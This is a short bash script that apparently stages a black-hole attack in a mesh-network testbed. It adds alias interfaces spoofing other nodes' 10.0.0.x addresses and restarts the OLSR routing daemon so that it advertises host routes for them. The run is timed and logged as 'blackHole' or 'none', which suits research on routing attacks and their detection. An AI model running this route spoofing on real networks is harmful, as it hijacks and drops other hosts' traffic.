#!/bin/bash
startTime=$1
pendingDuration=$2
attackingNode=$3
numberOfNodes=$4
logPath=$5
subnet=`echo $logPath | cut -d '_' -f9`

bringDownInterfaces()
{
sleep $pendingDuration
for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		if [ $nodeToSpoof != $attackingNode ]
			then
				ifconfig "eth0:$nodeToSpoof" down
		fi
	done
}

runOLSRAttack()
{
	killall nrlolsrd
	nrlolsrd -i eth0 -hna $logPath/tmp.txt &
	sleep $pendingDuration
	stopOLSRAttack
}

stopOLSRAttack()
{
	killall nrlolsrd
	bringDownInterfaces
	nrlolsrd -i eth0 &
}


bringUpInterfaces()
{
	for ((nodeToSpoof=1;nodeToSpoof <= numberOfNodes; nodeToSpoof++))
	do
		
		if [ $nodeToSpoof != $attackingNode ]
			then
				ipToSpoof="10.0.0.$nodeToSpoof"
				ifconfig eth0:$nodeToSpoof $ipToSpoof netmask 255.255.255.$subnet up
				echo "HNA $ipToSpoof 32" >> $logPath/tmp.txt
		fi
	done	
}

echo "none" > $logPath/attack.txt
sleep $startTime

if [ $pendingDuration -gt 0 ]
	then
		echo "blackHole" > $logPath/attack.txt

		if [[ $logPath == *"OLSR"* ]]
			then
				bringUpInterfaces
				runOLSRAttack
			else
				bringDownInterfaces
		fi
fi
echo "none" > $logPath/attack.txt

